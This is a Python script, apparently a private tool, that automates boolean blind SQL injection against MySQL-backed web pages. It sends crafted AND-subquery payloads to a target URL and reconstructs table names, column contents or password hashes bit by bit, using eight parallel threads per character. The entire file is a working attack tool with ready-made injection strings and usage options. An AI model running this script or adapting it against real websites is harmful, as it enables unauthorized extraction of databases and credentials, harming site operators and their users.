#!/usr/bin/env python
#
#########################################################
# PRIV8 - PRIV8 - PRIV8 - PRIV8 - PRIV8 - PRIV8 - PRIV8 #
#########################################################
#
# [ 08-20-2020 ]
#
# sql-anding.py
# Fastest method in the planet for Boolean Blind SQL Injections
# method created by Ruben Ventura [tr3w]
# retrieves an MD5 hash in 4 second 
#
# written by Ruben Ventura [tr3w]
# twitter: @tr3w_
# ig: @rub3n.ventura
# yt: youtube.com/trew00
#
# "there are only 10 types of people in the world,
#  those who understand binary, and those who don't"
#

import sys
import string
import requests
import hashlib
import time
import argparse
import threading

binstr = 0x00000000
request = 0

def pwn(injection):
       
        
    url = target + injection
    url = url.replace(' ', '+')
    r = requests.get(url)
    data = r.text

    global request
    request += 0x01
 

    return data if true_string != '0' else hashlib.md5(data.encode('utf-8')).hexdigest()

def get_length():

    index = 0x01
    j = 0x01
    
    binlen = '00000000'
    
    size_limit = 0x00
    sizes = [0xff, 0xffff, 0xffffff, 0xffffffff, 0xffffffffffffffff ]
    c = 0x00
    while 1:
        inj_length = "%d AND(SELECT LENGTH(%s)FROM %s LIMIT/*LESS*/%d,1)>%d" % (tid, column, table, row, sizes[c])
        res_length = pwn(inj_length)
        
        c += 0x01
        if true_string != '0':
            if true_string not in res_length:
                break
        else:
            if signature not in res_length:
                break
            
    size = sizes[c - 0x01] + 0x01
    limit = size >> (0x05 * c)
    
    sys.stdout.write("[+] Calculating length: ")
    sys.stdout.flush()
    
    for i in range(0x01, limit + 0x01 ):
       
        
        injection = "%d AND(SELECT MID(LPAD(BIN(length(%s)),%d,'0'),%d,1)FROM %s LIMIT/*LESS*/%d,1)" % (tid, column, limit, i, table, row)
        result = pwn(injection)
            
         
        if true_string != '0':
            bit = '1' if true_string in result else '0'        
        else:
            bit = '1' if signature in result else '0'
   
        
        sys.stdout.write("%s" % (bit))
        sys.stdout.flush()
        binlen = binlen[ : i - 0x01] + bit + binlen[ i + 0x01 : ]
    
    binlen = int(binlen, 0x02)
    sys.stdout.write('\n[+] Length found: %d\n' % (binlen))
    return binlen



def inject(index, j):

    injection = "%d AND(SELECT ASCII(MID(%s,%d,1))%%26%d FROM %s LIMIT/*LESS*/%d,1)=%d" % (tid, column, index, j, table, row, j)


 #   print("%s\n" % (injection))
    result = pwn(injection)
            
    if true_string != '0':
        bit = 0x01 if true_string in result else 0x00        
    else:
        bit = 0x01 if signature in result else 0x00

    global binstr
    if bit :
        binstr = binstr | j


def start():

    index = 1
    length = get_length()
    request = 0

    sys.stdout.write("-" * 0x45 + "\n\n" )

    while index <= length:

        t1 = threading.Thread(target = inject, args = (index, 0x1))
        t2 = threading.Thread(target = inject, args = (index, 0x2))
        t3 = threading.Thread(target = inject, args = (index, 0x4))
        t4 = threading.Thread(target = inject, args = (index, 0x8))
        t5 = threading.Thread(target = inject, args = (index, 0x10))
        t6 = threading.Thread(target = inject, args = (index, 0x20))
        t7 = threading.Thread(target = inject, args = (index, 0x40))         
        t8 = threading.Thread(target = inject, args = (index, 0x80))
            
        global binstr
        binstr = 0x0


        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
        t6.start()
        t7.start()
        t8.start()
        
        t1.join()
        t2.join()
        t3.join()
        t4.join()
        t5.join()
        t6.join()
        t7.join()
        t8.join()
        
        
        sys.stdout.write(chr(binstr))
        sys.stdout.flush()

        index  +=  0x01
    
    return 0x01


parser = argparse.ArgumentParser(description="Blind MySQL Injection data extraction through bit-anding by tr3w.")
parser.add_argument('-i','--trueid',    default = 1,    type=int,
        help = 'id of the page when result is true (default: %(default)s)')
parser.add_argument('-s','--string', default = '0',
        help = 'Unique string found when result is true, omit to automatically use a signature')
parser.add_argument('-c','--column',     default = "group_concat(table_name)",
        help = 'Column to extract from table (default: %(default)s)')
parser.add_argument('-t','--table',    default = "information_schema.tables",
        help = 'Table name from where to extract data (default: %(default)s)')
parser.add_argument('-r','--row', default = 0, type=int,
        help = 'Row number to extract, default: 0')
parser.add_argument('TARGET', help='The vulnerable URL. Example: http://vuln.com/page.php?id= ')
args = parser.parse_args()

tid = args.trueid
true_string = args.string
column    = args.column
table    = args.table
row = args.row
target    = args.TARGET

signature = pwn(str(tid)) if true_string == '0' else 0x00    


timer =  time.strftime("%X")
start()
sys.stdout.write("\n\n[+] Start Time: " + timer)
sys.stdout.write("\n[+] End Time:   " + time.strftime("%X"))
sys.stdout.write("\n[+] %d requests\n" % (request))
sys.stdout.write("\n[+] Done.\n")
    
